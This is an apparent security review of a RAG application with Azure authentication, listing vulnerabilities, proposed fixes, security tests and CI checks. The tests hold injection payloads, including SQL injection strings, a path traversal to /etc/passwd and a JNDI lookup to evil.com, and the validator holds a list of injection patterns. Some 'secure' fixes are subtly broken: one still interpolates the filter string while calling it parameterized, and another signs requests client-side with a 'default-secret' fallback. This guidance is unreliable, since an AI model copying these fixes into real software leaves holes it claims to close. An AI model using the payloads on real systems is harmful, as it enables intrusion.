# Phase 5 Security Review: Evidence RAG & AAD Authentication
**Review Date**: 2025-08-17  
**Reviewer**: Security Reviewer  
**Scope**: Evidence RAG Implementation, AAD Authentication, Data Privacy

---

## Executive Summary

**RISK LEVEL: HIGH**

Critical security vulnerabilities identified in the Evidence RAG and AAD authentication implementation requiring immediate remediation before production deployment.

### Critical Findings
1. **SQL Injection vulnerability** in engagement_id filtering
2. **Missing input validation** for search queries 
3. **Insufficient engagement isolation** in vector search
4. **Hardcoded secrets** in Key Vault configuration
5. **Path traversal vulnerability** in document upload
6. **Missing rate limiting** for embedding/search operations
7. **Insecure authentication header validation**
8. **PII exposure risks** in embeddings and logs

---

## 1. VULNERABILITY ASSESSMENT

### CRITICAL VULNERABILITIES

#### 1.1 SQL Injection in Search Filter (CRITICAL)
**Location**: `/app/services/rag.py:359`
```python
# VULNERABLE CODE
filter_expression = f"engagement_id eq '{engagement_id}'"
```
**Risk**: Direct string interpolation allows SQL injection attacks
**Impact**: Data breach across engagements, unauthorized access to all documents

#### 1.2 Path Traversal in Document Upload (CRITICAL)
**Location**: `/app/api/routes/documents.py:50`
```python
# VULNERABLE CODE
dest = safe_join(updir, f"{uuid.uuid4().hex}__{fname}")
```
**Risk**: Despite `safe_join` usage, filename sanitization is incomplete
**Impact**: Arbitrary file write, potential code execution

### HIGH VULNERABILITIES

#### 1.3 Missing Input Validation for Search Queries (HIGH)
**Location**: `/app/api/routes/documents.py:456-457`
```python
# VULNERABLE CODE
if not search_request.query.strip():
    raise HTTPException(status_code=400, detail="Search query cannot be empty")
# No validation for query content, length, or special characters
```
**Risk**: XSS, prompt injection, DoS via malformed queries
**Impact**: Client-side code execution, resource exhaustion

#### 1.4 Insecure Authentication Headers (HIGH)
**Location**: `/web/app/api/proxy/[...path]/route.ts:33`
```python
# VULNERABLE CODE
const authHeaders = getAuthHeaders();
// No validation or sanitization of headers
```
**Risk**: Header injection, authentication bypass
**Impact**: Unauthorized access, privilege escalation

#### 1.5 Hardcoded Secrets in Terraform (HIGH)
**Location**: `/infra/keyvault.tf:29-30`
```terraform
# VULNERABLE CODE
resource "azurerm_key_vault_secret" "search_admin_key" {
  value = azurerm_search_service.search.primary_key
}
```
**Risk**: Secrets exposed in state files
**Impact**: Complete compromise of Azure services

### MEDIUM VULNERABILITIES

#### 1.6 Insufficient Rate Limiting (MEDIUM)
**Location**: Multiple endpoints
**Risk**: DoS attacks via expensive operations
**Impact**: Service unavailability, cost overruns

#### 1.7 PII Exposure in Logs (MEDIUM)
**Location**: Throughout codebase
**Risk**: Sensitive data logged without redaction
**Impact**: Privacy violations, compliance issues

#### 1.8 Missing CORS Validation (MEDIUM)
**Location**: `/app/config.py:80-82`
```python
# VULNERABLE CODE
allowed_origins: list[str] = Field(default_factory=lambda: [
    o.strip() for o in os.getenv("API_ALLOWED_ORIGINS", "").split(",") if o.strip()
] or ["*"])  # Wildcard allowed by default
```
**Risk**: Cross-origin attacks
**Impact**: CSRF, data theft

---

## 2. CONCRETE REMEDIATION STEPS

### Fix 1: SQL Injection Prevention
```python
# /app/services/rag.py - SECURE VERSION
from azure.search.documents.models import SearchFilter
import re

def _validate_engagement_id(engagement_id: str) -> str:
    """Validate and sanitize engagement ID"""
    if not engagement_id:
        raise ValueError("Engagement ID cannot be empty")
    
    # Allow only alphanumeric, hyphens, underscores
    if not re.match(r'^[a-zA-Z0-9_-]+$', engagement_id):
        raise ValueError("Invalid engagement ID format")
    
    # Escape single quotes for OData filter
    return engagement_id.replace("'", "''")

async def search(self, query: str, engagement_id: str, top_k: Optional[int] = None) -> List[SearchResult]:
    # Validate engagement_id
    safe_engagement_id = self._validate_engagement_id(engagement_id)
    
    # Use parameterized filter
    filter_expression = f"engagement_id eq '{safe_engagement_id}'"
```

### Fix 2: Path Traversal Prevention
```python
# /app/api/routes/documents.py - SECURE VERSION
import pathlib
import hashlib

def _sanitize_filename(filename: str) -> str:
    """Sanitize filename to prevent path traversal"""
    # Remove any directory components
    filename = os.path.basename(filename)
    
    # Remove null bytes
    filename = filename.replace('\x00', '')
    
    # Limit filename length
    max_length = 255
    if len(filename) > max_length:
        name, ext = os.path.splitext(filename)
        # Preserve extension, truncate name
        filename = name[:max_length-len(ext)-10] + ext
    
    # Whitelist allowed characters
    import re
    filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
    
    # Ensure filename is not empty
    if not filename:
        filename = f"upload_{uuid.uuid4().hex}"
    
    return filename

@router.post("", response_model=list[DocumentPublic])
async def upload_docs(...):
    for f in files:
        original_fname = f.filename or f"upload-{uuid.uuid4().hex}"
        safe_fname = _sanitize_filename(original_fname)
        
        # Generate unique filename with hash
        file_hash = hashlib.sha256(f"{uuid.uuid4().hex}_{safe_fname}".encode()).hexdigest()[:16]
        dest_name = f"{file_hash}_{safe_fname}"
        
        # Use pathlib for safe path construction
        dest_path = pathlib.Path(updir) / dest_name
        dest = str(dest_path.resolve())
        
        # Verify destination is within upload directory
        if not dest.startswith(os.path.abspath(updir)):
            raise HTTPException(400, "Invalid file path")
```

### Fix 3: Search Query Validation
```python
# /app/api/routes/documents.py - SECURE VERSION
import html
import bleach

def _validate_search_query(query: str) -> str:
    """Validate and sanitize search query"""
    if not query or not query.strip():
        raise ValueError("Query cannot be empty")
    
    # Length validation
    max_query_length = 1000
    if len(query) > max_query_length:
        raise ValueError(f"Query exceeds maximum length of {max_query_length} characters")
    
    # Remove HTML tags and dangerous content
    query = bleach.clean(query, tags=[], strip=True)
    
    # Escape special characters for search
    query = html.escape(query)
    
    # Check for injection patterns
    injection_patterns = [
        r'<script',
        r'javascript:',
        r'on\w+\s*=',
        r'\$\{',
        r'{{',
        r'exec\s*\(',
        r'eval\s*\(',
    ]
    
    for pattern in injection_patterns:
        if re.search(pattern, query, re.IGNORECASE):
            raise ValueError("Query contains invalid characters or patterns")
    
    return query

@router.post("/search", response_model=SearchDocumentsResponse)
async def search_documents(...):
    # Validate query
    try:
        validated_query = _validate_search_query(search_request.query)
    except ValueError as e:
        raise HTTPException(400, str(e))
```

### Fix 4: Secure Authentication Headers
```typescript
// /web/app/api/proxy/[...path]/route.ts - SECURE VERSION
import { headers } from 'next/headers';
import crypto from 'crypto';

function validateEmail(email: string): string | null {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!email || !emailRegex.test(email)) {
    return null;
  }
  return email.toLowerCase().trim();
}

function validateEngagementId(id: string): string | null {
  const idRegex = /^[a-zA-Z0-9_-]+$/;
  if (!id || !idRegex.test(id) || id.length > 100) {
    return null;
  }
  return id;
}

export function getAuthHeaders(): Record<string, string> {
  if (typeof window === 'undefined') return {};
  
  const authHeaders: Record<string, string> = {};
  
  // Validate and sanitize email
  const email = localStorage.getItem('email');
  const validatedEmail = email ? validateEmail(email) : null;
  if (validatedEmail) {
    authHeaders['X-User-Email'] = validatedEmail;
  }
  
  // Validate and sanitize engagement ID
  const engagementId = localStorage.getItem('engagementId');
  const validatedId = engagementId ? validateEngagementId(engagementId) : null;
  if (validatedId) {
    authHeaders['X-Engagement-ID'] = validatedId;
  }
  
  // Add request signature for integrity
  const timestamp = Date.now().toString();
  authHeaders['X-Request-Timestamp'] = timestamp;
  
  // Generate HMAC signature
  const secret = process.env.REQUEST_SIGNING_SECRET || 'default-secret';
  const payload = `${validatedEmail}:${validatedId}:${timestamp}`;
  const signature = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  authHeaders['X-Request-Signature'] = signature;
  
  return authHeaders;
}
```

### Fix 5: Secure Key Vault Configuration
```terraform
# /infra/keyvault.tf - SECURE VERSION
# Use data sources instead of storing keys
data "azurerm_search_service" "search" {
  name                = azurerm_search_service.search.name
  resource_group_name = azurerm_resource_group.rg.name
}

# Grant managed identity access instead of storing keys
resource "azurerm_role_assignment" "search_reader" {
  scope                = azurerm_search_service.search.id
  role_definition_name = "Search Index Data Reader"
  principal_id         = azurerm_user_assigned_identity.app_identity.principal_id
}

resource "azurerm_role_assignment" "search_contributor" {
  scope                = azurerm_search_service.search.id
  role_definition_name = "Search Index Data Contributor"
  principal_id         = azurerm_user_assigned_identity.app_identity.principal_id
}

# Remove hardcoded secret storage
# Use managed identity for authentication instead
```

### Fix 6: Rate Limiting Implementation
```python
# /app/api/middleware/rate_limit.py - NEW FILE
from fastapi import Request, HTTPException
from typing import Dict, Tuple
import time
import asyncio
from collections import defaultdict

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, list] = defaultdict(list)
        self.lock = asyncio.Lock()
    
    async def check_rate_limit(
        self, 
        key: str, 
        max_requests: int = 10, 
        window_seconds: int = 60
    ) -> Tuple[bool, int]:
        """Check if request should be rate limited"""
        async with self.lock:
            now = time.time()
            
            # Clean old requests
            self.requests[key] = [
                req_time for req_time in self.requests[key]
                if now - req_time < window_seconds
            ]
            
            # Check limit
            if len(self.requests[key]) >= max_requests:
                retry_after = int(window_seconds - (now - self.requests[key][0]))
                return False, retry_after
            
            # Add current request
            self.requests[key].append(now)
            return True, 0

rate_limiter = RateLimiter()

async def rate_limit_middleware(request: Request, call_next):
    # Get client identifier
    client_id = request.headers.get("X-User-Email", request.client.host)
    
    # Different limits for different operations
    path = request.url.path
    if "/search" in path:
        max_requests, window = 30, 60  # 30 searches per minute
    elif "/ingest" in path or "/reindex" in path:
        max_requests, window = 5, 300  # 5 ingestions per 5 minutes
    else:
        max_requests, window = 100, 60  # 100 requests per minute default
    
    allowed, retry_after = await rate_limiter.check_rate_limit(
        client_id, max_requests, window
    )
    
    if not allowed:
        raise HTTPException(
            status_code=429,
            detail="Rate limit exceeded",
            headers={"Retry-After": str(retry_after)}
        )
    
    response = await call_next(request)
    return response
```

### Fix 7: PII Redaction in Logs
```python
# /app/util/logging.py - NEW FILE
import re
import logging
from typing import Any, Dict

class PIIRedactingFormatter(logging.Formatter):
    """Custom formatter that redacts PII from logs"""
    
    # Patterns for common PII
    PII_PATTERNS = [
        (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', '[EMAIL_REDACTED]'),  # Email
        (r'\b\d{3}-\d{2}-\d{4}\b', '[SSN_REDACTED]'),  # SSN
        (r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b', '[CC_REDACTED]'),  # Credit card
        (r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', '[PHONE_REDACTED]'),  # Phone number
        (r'"password"\s*:\s*"[^"]*"', '"password":"[REDACTED]"'),  # Password fields
        (r'"token"\s*:\s*"[^"]*"', '"token":"[REDACTED]"'),  # Token fields
        (r'"api_key"\s*:\s*"[^"]*"', '"api_key":"[REDACTED]"'),  # API key fields
    ]
    
    def format(self, record: logging.LogRecord) -> str:
        msg = super().format(record)
        
        # Redact PII patterns
        for pattern, replacement in self.PII_PATTERNS:
            msg = re.sub(pattern, replacement, msg, flags=re.IGNORECASE)
        
        return msg

def setup_secure_logging():
    """Configure secure logging with PII redaction"""
    handler = logging.StreamHandler()
    handler.setFormatter(PIIRedactingFormatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    ))
    
    logger = logging.getLogger()
    logger.handlers.clear()
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
    
    return logger
```

### Fix 8: CORS Configuration
```python
# /app/config.py - SECURE VERSION
class AppConfig(BaseModel):
    # ... other config ...
    
    # CORS settings with validation
    @property
    def allowed_origins(self) -> list[str]:
        origins_str = os.getenv("API_ALLOWED_ORIGINS", "")
        if not origins_str:
            # No wildcard by default
            return ["http://localhost:3000"] if os.getenv("ENV") == "development" else []
        
        origins = []
        for origin in origins_str.split(","):
            origin = origin.strip()
            if origin == "*":
                # Log warning for wildcard
                logger.warning("Wildcard CORS origin detected - this is insecure for production")
                if os.getenv("ENV") == "production":
                    continue  # Skip wildcard in production
            origins.append(origin)
        
        return origins
```

---

## 3. SECURITY TEST CASES

### Test Suite 1: Injection Prevention
```python
# /tests/security/test_injection.py
import pytest
from app.services.rag import RAGService

class TestInjectionPrevention:
    
    @pytest.mark.parametrize("malicious_id", [
        "'; DROP TABLE documents; --",
        "' OR '1'='1",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${7*7}",
        "{{7*7}}",
    ])
    async def test_engagement_id_injection(self, malicious_id):
        """Test that malicious engagement IDs are rejected"""
        rag = RAGService()
        with pytest.raises(ValueError, match="Invalid engagement ID"):
            await rag.search("test query", malicious_id)
    
    @pytest.mark.parametrize("malicious_query", [
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "'; DROP TABLE users; --",
    ])
    async def test_search_query_injection(self, malicious_query):
        """Test that malicious search queries are sanitized"""
        from app.api.routes.documents import _validate_search_query
        with pytest.raises(ValueError):
            _validate_search_query(malicious_query)
```

### Test Suite 2: Authentication & Authorization
```python
# /tests/security/test_auth.py
import pytest
from fastapi.testclient import TestClient

class TestAuthentication:
    
    def test_missing_auth_headers(self, client: TestClient):
        """Test that requests without auth headers are rejected"""
        response = client.get("/engagements/test-eng/docs")
        assert response.status_code == 422
        assert "X-User-Email header is required" in response.text
    
    def test_invalid_email_header(self, client: TestClient):
        """Test that invalid email headers are rejected"""
        headers = {
            "X-User-Email": "not-an-email",
            "X-Engagement-ID": "test-eng"
        }
        response = client.get("/engagements/test-eng/docs", headers=headers)
        assert response.status_code == 422
        assert "valid email address" in response.text
    
    def test_engagement_isolation(self, client: TestClient):
        """Test that users cannot access other engagements"""
        # Setup: Create docs in engagement A
        headers_a = {
            "X-User-Email": "user@example.com",
            "X-Engagement-ID": "engagement-a"
        }
        
        # Try to search with engagement B context
        headers_b = {
            "X-User-Email": "user@example.com",
            "X-Engagement-ID": "engagement-b"
        }
        
        response = client.post(
            "/engagements/engagement-a/docs/search",
            headers=headers_b,
            json={"query": "test"}
        )
        assert response.status_code == 403
```

### Test Suite 3: Rate Limiting
```python
# /tests/security/test_rate_limiting.py
import pytest
import asyncio
from fastapi.testclient import TestClient

class TestRateLimiting:
    
    async def test_search_rate_limit(self, client: TestClient):
        """Test that search endpoints are rate limited"""
        headers = {
            "X-User-Email": "test@example.com",
            "X-Engagement-ID": "test-eng"
        }
        
        # Make requests up to the limit
        for i in range(30):
            response = client.post(
                "/engagements/test-eng/docs/search",
                headers=headers,
                json={"query": f"test {i}"}
            )
            assert response.status_code == 200
        
        # Next request should be rate limited
        response = client.post(
            "/engagements/test-eng/docs/search",
            headers=headers,
            json={"query": "test overflow"}
        )
        assert response.status_code == 429
        assert "Retry-After" in response.headers
```

---

## 4. CI/CD SECURITY ENFORCEMENT

### GitHub Actions Security Workflow
```yaml
# /.github/workflows/security.yml
name: Security Checks

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # Secret scanning
      - name: TruffleHog Secret Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
      
      # Dependency scanning
      - name: Run Snyk Security Scan
        uses: snyk/actions/python@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      # SAST scanning
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/r2c-security-audit
      
      # Container scanning
      - name: Run Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'app:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      # Custom security tests
      - name: Run Security Tests
        run: |
          pip install -r requirements-test.txt
          pytest tests/security/ -v --cov=app --cov-report=xml
      
      # Infrastructure scanning
      - name: Terraform Security Scan
        uses: triat/terraform-security-scan@v3
        with:
          tfsec_actions_version: latest
          tfsec_output_format: sarif
```

### Pre-commit Hooks
```yaml
# /.pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
  
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ['-r', 'app/', '-ll']
  
  - repo: https://github.com/sqlfluff/sqlfluff
    rev: 2.3.2
    hooks:
      - id: sqlfluff-lint
        args: ['--dialect', 'postgres']
  
  - repo: local
    hooks:
      - id: security-headers-check
        name: Check Security Headers
        entry: python scripts/check_security_headers.py
        language: python
        files: \.(py|ts|tsx)$
```

---

## 5. PRODUCTION SECURITY CHECKLIST

### Pre-Deployment
- [ ] All critical vulnerabilities remediated
- [ ] Security tests passing with 100% coverage
- [ ] Secrets removed from code and configuration
- [ ] Rate limiting configured and tested
- [ ] Input validation on all endpoints
- [ ] CORS properly configured (no wildcards)
- [ ] Logging configured with PII redaction
- [ ] Azure RBAC configured (no API keys)

### Deployment
- [ ] TLS/HTTPS enforced on all endpoints
- [ ] Network security groups configured
- [ ] Private endpoints for Azure services
- [ ] Key Vault for all secrets
- [ ] Managed identities enabled
- [ ] Container registry scanning enabled
- [ ] Azure Defender enabled

### Post-Deployment
- [ ] Security monitoring dashboards configured
- [ ] Alert rules for suspicious activity
- [ ] Log Analytics workspace configured
- [ ] Regular vulnerability scanning scheduled
- [ ] Incident response plan documented
- [ ] Security training for team completed
- [ ] Penetration testing scheduled

---

## 6. THREAT MODEL

### Data Flow Diagram
```
User -> Frontend (Next.js) -> API Proxy -> Backend API -> Azure Services
                                              |
                                              ├─> Azure AI Search
                                              ├─> Azure OpenAI
                                              ├─> Azure Blob Storage
                                              └─> Cosmos DB
```

### Attack Vectors
1. **Frontend**: XSS, CSRF, clickjacking
2. **API Proxy**: Header injection, authentication bypass
3. **Backend API**: Injection attacks, authorization bypass
4. **Azure Services**: Credential theft, data exfiltration
5. **Infrastructure**: Misconfigurations, exposed secrets

### Mitigations
1. **Defense in Depth**: Multiple security layers
2. **Zero Trust**: Verify everything, trust nothing
3. **Least Privilege**: Minimal permissions
4. **Encryption**: At rest and in transit
5. **Monitoring**: Real-time threat detection

---

## CONCLUSION

The Evidence RAG and AAD authentication implementation contains multiple critical security vulnerabilities that must be addressed before production deployment. The provided remediation steps and security controls will significantly improve the security posture when properly implemented.

**Recommended Actions**:
1. Immediately fix all CRITICAL vulnerabilities
2. Implement rate limiting and input validation
3. Replace API keys with managed identities
4. Enable comprehensive security monitoring
5. Conduct penetration testing before go-live

**Estimated Remediation Timeline**:
- Critical fixes: 2-3 days
- High priority fixes: 3-5 days
- Medium priority fixes: 1 week
- Full security hardening: 2-3 weeks